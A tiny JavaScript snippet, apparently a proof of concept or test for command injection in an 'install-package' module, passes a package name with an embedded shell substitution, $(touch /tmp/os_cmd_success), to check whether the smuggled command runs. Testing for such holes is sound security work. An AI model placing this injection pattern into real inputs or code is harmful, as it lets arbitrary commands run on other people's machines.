const install = require('install-package');

try {
  install(["left-pad $(touch /tmp/os_cmd_success) &"]);
} catch (e) {}
